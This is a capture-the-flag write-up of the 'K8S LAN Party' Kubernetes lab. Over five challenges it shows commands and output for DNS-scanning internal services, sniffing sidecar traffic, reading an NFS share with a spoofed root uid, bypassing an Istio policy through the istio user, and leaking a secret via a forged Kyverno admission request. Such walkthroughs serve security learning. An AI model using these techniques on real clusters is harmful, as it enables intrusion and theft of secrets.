---
description: https://k8slanparty.com/
cover: ../../.gitbook/assets/K8S party.png
coverY: 0
---

# K8S LAN Party Writeup

## Challenge 1 - DNSing with the stars

> You have shell access to compromised a Kubernetes pod at the bottom of this page, and your next objective is to compromise other internal services further.
>
> As a warmup, utilize [DNS scanning](https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue) to uncover hidden internal services and obtain the flag. We have "loaded your machine with [dnscan](https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e) to ease this process for further challenges.

```bash
> dnscan
Usage: ./dnscan -subnet <CIDR or Wildcard>

> env | grep HOST
KUBERNETES_SERVICE_HOST=10.100.0.1

> dnscan -subnet 10.100.0.1/16
10.100.136.254 getflag-service.k8s-lan-party.svc.cluster.local.

> curl 10.100.136.254 
wiz_k8s_lan_party{between-thousands-of-ips-you-found-your-northen-star}
```

## Challenge 2 - Hello?

> Sometimes, it seems we are the only ones around, but we should always be on guard against invisible [sidecars](https://kubernetes.io/docs/concepts/workloads/pods/sidecar-containers/) reporting sensitive secrets.

Let's look at the tcpdump to see the traffic that the sidecar is making

```bash
> tcpdump
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on ns-d4e2eb, link-type EN10MB (Ethernet), snapshot length 262144 bytes
12:15:28.034418 IP 192.168.10.255.45492 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [S], seq 824150725, win 64240, options [mss 1460,sackOK,TS val 4127382585 ecr 0,nop,wscale 7], length 0
12:15:28.035025 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.10.255.45492: Flags [S.], seq 4148269520, ack 824150726, win 65160, options [mss 1460,sackOK,TS val 494105167 ecr 4127382585,nop,wscale 7], length 0
12:15:28.035036 IP 192.168.10.255.45492 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 4127382586 ecr 494105167], length 0
12:15:28.035079 IP 192.168.10.255.45492 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [P.], seq 1:215, ack 1, win 502, options [nop,nop,TS val 4127382586 ecr 494105167], length 214: HTTP: POST / HTTP/1.1
12:15:28.035400 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.10.255.45492: Flags [.], ack 215, win 508, options [nop,nop,TS val 494105168 ecr 4127382586], length 0
12:15:28.038611 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.10.255.45492: Flags [P.], seq 1:206, ack 215, win 508, options [nop,nop,TS val 494105171 ecr 4127382586], length 205: HTTP: HTTP/1.1 200 OK
12:15:28.038619 IP 192.168.10.255.45492 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [.], ack 206, win 501, options [nop,nop,TS val 4127382589 ecr 494105171], length 0
12:15:28.038717 IP 192.168.10.255.45492 > reporting-service.k8s-lan-party.svc.cluster.local.http: Flags [F.], seq 215, ack 206, win 501, options [nop,nop,TS val 4127382590 ecr 494105171], length 0
12:15:28.038930 IP reporting-service.k8s-lan-party.svc.cluster.local.http > 192.168.10.255.45492: Flags [F.], seq 206, ack 216, win 508, options [nop,nop,TS val 494105172 ecr 4127382590], length 0

> dig +short reporting-service.k8s-lan-party.svc.cluster.local A
10.100.171.123
```

Let's pole around the ip to see if there is other info.

Poked around with nmap but did not find anything much. Read the description again and understood the secret was reported by the sidecars in the traffic.

```bash
# -A prints the packet in ASCII format
> tcpdump -A | grep wiz
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on ns-d4e2eb, link-type EN10MB (Ethernet), snapshot length 262144 bytes
wiz_k8s_lan_party{good-crime-comes-with-a-partner-in-a-sidecar}
```

## Challenge 3 - Exposed File Share

> The targeted big corp utilizes outdated, yet cloud-supported technology for data storage in production. But oh my, this technology was introduced in an era when access control was only network-based 🤦‍️.

It says exposed file share so lets check the information on the file system

```bash
>  df
Filesystem                                                1K-blocks    Used        Available Use% Mounted on
overlay                                                   314560492 8667784        305892708   3% /
fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ 9007199254739968       0 9007199254739968   0% /efs
tmpfs                                                      62022172      12         62022160   1% /var/run/secrets/kubernetes.io/serviceaccount
tmpfs                                                         65536       0            65536   0% /dev/null
```

There is an efs `fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com`&#x20;

```bash
> cd /efs
> ls
flag.txt
>  cat flag.txt
cat: flag.txt: Permission denied
```

Going through from more information and hints [https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-efs-enum](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-efs-enum)

```bash
> dig +short fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com
192.168.124.98
> nfs-ls nfs://192.168.124.98
Failed to mount nfs share : mount_cb: nfs_service failed
# Times out
```

Looked at some nfs-ls writeups and libnfs found a workaround

```bash
> nfs-ls nfs://192.168.124.98/?version=4.1
----------  1     1     1           73 flag.txt
> nfs-cat "nfs://192.168.124.98//flag.txt?version=4&uid=0"
wiz_k8s_lan_party{old-school-network-file-shares-infiltrated-the-cloud!}
```

## Challenge 4 - The Beauty and The Ist

> Apparently, new service mesh technologies hold unique appeal for ultra-elite users (root users). Don't abuse this power; use it responsibly and with caution.

{% code title="Policy" overflow="wrap" %}
```yaml
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: istio-get-flag
  namespace: k8s-lan-party
spec:
  action: DENY
  selector:
    matchLabels:
      app: "{flag-pod-name}"
  rules:
  - from:
    - source:
        namespaces: ["k8s-lan-party"]
    to:
    - operation:
        methods: ["POST", "GET"]
```
{% endcode %}

The policy shows us that there is an endpoint `istio-get-flag` we can request the flag from. However the HTTP verbs POST and GET are denied by an ISTIO policy which we need to bypass.

We know the endpoint but not the name of the service. Lets do a dnscan to poke around and find out .

```bash
> env | grep HOST 
KUBERNETES_SERVICE_HOST=10.100.0.1
> dnscan -subnet 10.100.0.1/16
10.100.224.159 istio-protected-pod-service.k8s-lan-party.svc.cluster.local.
```

`hold unique appeal for ultra-elite users (root users)` Let's look at /etc/passwd to check all the users once, seeing that some of the users could appeal the pod.

```bash
> cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
_rpc:x:102:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:103:65534::/var/lib/nfs:/usr/sbin/nologin
istio:x:1337:1337::/home/istio:/bin/sh # <-------------
player:x:1001:1001::/home/player:/bin/sh
```

There is a user called istio which has shell service. Lets try to switch to the user istio and see if we can do a curl to the istio-pod.

```bash
> su istio
$ curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local; echo      
wiz_k8s_lan_party{only-leet-hex0rs-can-play-both-k8s-and-linux}
```

## Challenge 5 - Who will guard the guardians?

> Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the [administrative](https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request) services.

{% code title="Policy" overflow="wrap" %}
```yaml
apiVersion: kyverno.io/v1
kind: Policy
metadata:
  name: apply-flag-to-env
  namespace: sensitive-ns
spec:
  rules:
    - name: inject-env-vars
      match:
        resources:
          kinds:
            - Pod
      mutate:
        patchStrategicMerge:
          spec:
            containers:
              - name: "*"
                env:
                  - name: FLAG
                    value: "{flag}"
```
{% endcode %}

Let's start off with a dnscan to check the services

```bash
> dnscan --subnet 10.100.0.1/16
10.100.86.210 -> kyverno-cleanup-controller.kyverno.svc.cluster.local.
10.100.126.98 -> kyverno-svc-metrics.kyverno.svc.cluster.local.
10.100.158.213 -> kyverno-reports-controller-metrics.kyverno.svc.cluster.local.
10.100.171.174 -> kyverno-background-controller-metrics.kyverno.svc.cluster.local.
10.100.217.223 -> kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.
10.100.232.19 -> kyverno-svc.kyverno.svc.cluster.local.
```

{% hint style="success" %}
Let's understood Kyverno before we dive in

Kyverno is a tool for Kubernetes that helps manage configurations and enforce policies across clusters. It ensures compliance and security by defining rules through custom resource definitions (CRDs), giving precise control over resource management and behavior.

The policy given in the challenge is saying that any pod created in the _sensitive-ns_ will have the secret injected in the FLAG env variable.
{% endhint %}

When a request is made to the Kubernetes API server it is then forwarded to a validator/mutating webhook without authentication.

In our case it Kyverno (`kyverno-svc.kyverno.svc.cluster.local`), if the pod matches the policy `apply-flag-to-env` it will modify the pod's specifications (its configuration) after it has been created, but before it's persisted in the Kubernetes API server.

```bash
> host kyverno-svc.kyverno.svc.cluster.local
kyverno-svc.kyverno.svc.cluster.local has address 10.100.232.19
```

To create a pod admission request , we can use a tool called [kube-review](https://github.com/anderseknert/kube-review). On your local machine save a pod with a yaml file with the below code, Use the same namespace from the policy initially given to us.

{% code title="pod.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: sensitive-pod
  namespace: sensitive-ns
spec:
  containers:
  - name: nginx
    image: nginx:latest
```
{% endcode %}

To create the admission request, download kube-review locally and run the below command

```bash
> kube-review create pod.yaml
{
  "kind": "AdmissionReview",
  "apiVersion": "admission.k8s.io/v1",
  "request": {
    "uid": "69ce7dea-2a90-43d3-87e3-9551f8c96c18",
    "kind": {
      "group": "",
      "version": "v1",
      "kind": "Pod"
    },
    "resource": {
      "group": "",
      "version": "v1",
      "resource": "pods"
    },
    "requestKind": {
      "group": "",
      "version": "v1",
      "kind": "Pod"
    },
    "requestResource": {
      "group": "",
      "version": "v1",
      "resource": "pods"
    },
    "name": "sensitive-pod",
    "namespace": "sensitive-ns",
    "operation": "CREATE",
    "userInfo": {
      "username": "kube-review",
      "uid": "85b364f1-d34c-4279-a6e8-8685d4314736"
    },
    "object": {
      "kind": "Pod",
      "apiVersion": "v1",
      "metadata": {
        "name": "sensitive-pod",
        "namespace": "sensitive-ns",
        "creationTimestamp": null
      },
      "spec": {
        "containers": [
          {
            "name": "nginx",
            "image": "nginx:latest",
            "resources": {}
          }
        ]
      },
      "status": {}
    },
    "oldObject": null,
    "dryRun": true,
    "options": {
      "kind": "CreateOptions",
      "apiVersion": "meta.k8s.io/v1"
    }
  }
}
```

Paste the JSON in a pastebin file and transfer the file to the shell and store in a file named pod.json

```bash
> wget https://pastebin.com/raw/{your-id} -o pod.yaml

> curl -X POST -H "Content-Type: application/json" --data @pod.json https://kyverno-svc.kyverno.svc.cluster.local/mutate -k | jq .
{
# <------------- ---------------->
  "response": {
    "uid": "69ce7dea-2a90-43d3-87e3-9551f8c96c18",
    "allowed": true,
    "patch": "W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwZWMvY29udGFpbmVycy8wL2VudiIsInZhbHVlIjpbeyJuYW1lIjoiRkxBRyIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9XX0sIHsicGF0aCI6Ii9tZXRhZGF0YS9hbm5vdGF0aW9ucyIsIm9wIjoiYWRkIiwidmFsdWUiOnsicG9saWNpZXMua3l2ZXJuby5pby9sYXN0LWFwcGxpZWQtcGF0Y2hlcyI6ImluamVjdC1lbnYtdmFycy5hcHBseS1mbGFnLXRvLWVudi5reXZlcm5vLmlvOiBhZGRlZCAvc3BlYy9jb250YWluZXJzLzAvZW52XG4ifX1d",
    "patchType": "JSONPatch"
  }
}
```

We can see the response patch is in base64 converting it on [CyberChef](https://gchq.github.io/CyberChef/) we get the flag

{% code overflow="wrap" %}
```json
[{"op":"add","path":"/spec/containers/0/env","value":[{"name":"FLAG","value":"wiz_k8s_lan_party{you-are-k8s-net-master-with-great-power-to-mutate-your-way-to-victory}"}]}, {"path":"/metadata/annotations","op":"add","value":{"policies.kyverno.io/last-applied-patches":"inject-env-vars.apply-flag-to-env.kyverno.io: added /spec/containers/0/env\n"}}]
```
{% endcode %}

<figure><img src="../../.gitbook/assets/K8S party.png" alt=""><figcaption></figcaption></figure>
